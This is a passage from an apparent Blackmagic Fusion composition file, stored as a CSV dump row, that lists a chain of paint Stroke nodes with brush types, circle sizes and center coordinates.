id,title,username,language,date,content
				Center = Input { Value = { 0.219968497753143, 0.884206354618073 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke53 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378819093 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke52"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.22784560918808, 0.915714859962463 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke52 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378816137 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke51"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.171918079257011, 0.9235919713974 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke51 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378813843 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke50"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.050216618925333, 0.922410368919373 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke50 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378811067 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke49"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.110476568341255, 0.859787344932556 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke49 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378808188 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke48"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.198306426405907, 0.747932255268097 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke48 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378805263 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke47"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.20106340944767, 0.66128396987915 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke47 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378803448 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke46"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.173493504524231, 0.688066184520721 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke46 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378801888 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke45"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.105356439948082, 0.649862170219421 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke45 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378799952 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke44"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.143954306840897, 0.638046503067017 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke44 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378798288 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke43"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.158920839428902, 0.603387176990509 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke43 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378794733 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke42"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.233359590172768, 0.519102036952972 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke42 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378792168 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke41"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.157345414161682, 0.574241816997528 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke41 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378790173 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke40"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.0793619528412819, 0.545884191989899 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke40 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378787217 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke39"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.195155575871468, 0.469870030879974 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke39 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378784188 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke38"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.192398577928543, 0.401732951402664 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke38 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378781878 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke37"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.209728240966797, 0.400945246219635 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke37 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378780182 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke36"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.234935015439987, 0.388735711574554 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke36 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378778922 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke35"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.240448996424675, 0.384797155857086 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke35 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378777003 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke34"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.210909813642502, 0.355257987976074 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke34 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378775203 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke33"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.256203234195709, 0.345411568880081 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke33 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378771497 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke32"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.422016531229019, 0.284757792949677 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke32 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378769757 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke31"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.404686897993088, 0.282000780105591 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke31 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378765077 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke30"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.275108307600021, 0.302481293678284 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke30 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378763862 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke29"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.310949206352234, 0.30051201581955 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke29 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378762167 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke28"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.335368245840073, 0.27451753616333 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke28 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378760382 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke27"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.336155980825424, 0.213863730430603 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke27 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378757577 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke26"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.131744787096977, 0.300905883312225 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke26 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378755342 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
